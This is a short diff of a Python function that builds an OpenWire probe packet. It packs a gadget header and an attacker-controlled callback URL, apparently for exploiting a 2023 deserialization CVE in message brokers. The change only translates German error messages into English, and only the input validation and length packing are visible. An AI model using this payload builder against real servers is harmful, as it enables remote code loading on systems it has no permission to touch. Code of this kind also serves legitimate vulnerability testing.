@@ -58,14 +58,14 @@ def build_probe_packet(callback_url: str, gadget: str = "spring-fsxml-cve-2023-4
     control our own server, so that indirection is unnecessary).
     """
     if gadget not in GADGETS:
-        raise ValueError(f"openwire_payload: unbekanntes Gadget {gadget!r}")
+        raise ValueError(f"openwire_payload: unknown gadget {gadget!r}")
     if not callback_url or not callback_url.startswith(("http://", "https://")):
-        raise ValueError("openwire_payload: callback_url muss eine http(s)-URL sein")
+        raise ValueError("openwire_payload: callback_url must be an http(s) URL")
 
     header = bytes.fromhex(GADGETS[gadget] + "0")[:-1]  # drop the padding nibble added only for hex parsing
     resource_bytes = callback_url.encode("utf-8")
     if len(resource_bytes) > 0xFFFF:
-        raise ValueError("openwire_payload: callback_url zu lang fuer ein 2-Byte-Laengenfeld")
+        raise ValueError("openwire_payload: callback_url too long for a 2-byte length field")
     # The reference JS template concatenates hex strings with an UNPADDED
     # `(len).toString(16)` for this field, which only happens to produce a
     # byte-aligned total for length values needing an odd digit count
